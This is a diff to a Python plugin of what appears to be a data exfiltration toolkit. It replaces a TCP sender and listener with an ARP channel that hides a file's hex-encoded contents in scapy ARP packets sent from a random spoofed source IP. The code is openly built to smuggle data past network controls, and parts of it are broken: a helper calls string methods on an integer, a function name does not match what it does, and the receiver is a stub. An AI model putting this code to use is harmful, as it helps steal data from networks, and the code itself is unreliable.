@@ -1,57 +1,56 @@
 import socket
-import sys
+import struct
+import os
+
+from scapy.all import Ether, ARP, RandIP, Raw, sendp, sniff
 
 config = None
 app_exfiltrate = None
 
 
-def send(data):
+def send(exfiltrate_file, file):
     target = config['target']
-    port = config['port']
-    app_exfiltrate.log_message(
-        'info', "[tcp] Sending {0} bytes to {1}".format(len(data), target))
-    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client_socket.connect((target, port))
-    client_socket.send(data.encode('hex'))
-    client_socket.close()
+    num_bytes = config['num_bytes']
+
+    app_exfiltrate.log_message('warning', "[!] Registering packet for the file")
+    data = "%s" % os.path.basename(exfiltrate_file.file_to_send)
+
+    packet_index = 0
+    ether = Ether()
+    rand_ip = RandIP()
+    arp = ARP(psrc=rand_ip, hwsrc='00:00:00:00:00:00')
+    pkt= ether / arp / Raw(load=data)
+    sendp(pkt, verbose=0)
+
+    while True:
+        packet_index += 1
+        data_file = file.read(num_bytes).encode('hex')
+        if not data_file:
+            break
+        # ok("Using {0} as transport method".format(protocol_name))
+
+        app_exfiltrate.log_message('info', "[arp] Sending {0} bytes to {1}".format(len(data), target))
+        arp = ARP(psrc=rand_ip, hwsrc=int_to_mac(packet_index))
+        pkt = ether / arp / Raw(load=data_file)
+        sendp(pkt, verbose=0)
+
+    data = "DONE:%s" % exfiltrate_file.checksum
+    arp = ARP(psrc=rand_ip, hwsrc=int_to_mac(packet_index))
+    pkt = ether / arp / Raw(load=data)
+    sendp(pkt, verbose=0)
+
+
+def int_to_mac(number):
+    return int(number.translate(None, ":.- "), 16)
 
 
 def listen():
-    port = config['port']
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    pass
 
-    try:
-        server_address = ('', port)
-        sock.bind(server_address)
-        app_exfiltrate.log_message(
-            'info', "[tcp] Starting server on port {}...".format(port))
-        sock.listen(1)
-    except:
-        app_exfiltrate.log_message(
-            'warning', "[tcp] Couldn't bind on port {}...".format(port))
-        sys.exit(-1)
 
-    while True:
-        app_exfiltrate.log_message('info', "[tcp] Waiting for connections...")
-        connection, client_address = sock.accept()
-        try:
-            app_exfiltrate.log_message(
-                'info', "[tcp] client connected: {}".format(client_address))
-            while True:
-                data = connection.recv(65535)
-                if data:
-                    app_exfiltrate.log_message(
-                        'info', "[tcp] Received {} bytes".format(len(data)))
-                    try:
-                        data = data.decode('hex')
-                        app_exfiltrate.retrieve_data(data)
-                    except Exception, e:
-                        app_exfiltrate.log_message(
-                            'warning', "[tcp] Failed decoding message {}".format(e))
-                else:
-                    break
-        finally:
-            connection.close()
+def mac_to_int(ip):
+    packedIP = socket.inet_aton(ip)
+    return struct.unpack("!L", packedIP)[0]
 
 
 class Plugin:
@@ -60,4 +59,4 @@ class Plugin:
         global app_exfiltrate
         config = conf
         app_exfiltrate = app
-        app.register_plugin('arp', {'send': send, 'listen': listen})
+        app.register_protocol('arp', {'send': send, 'listen': listen})
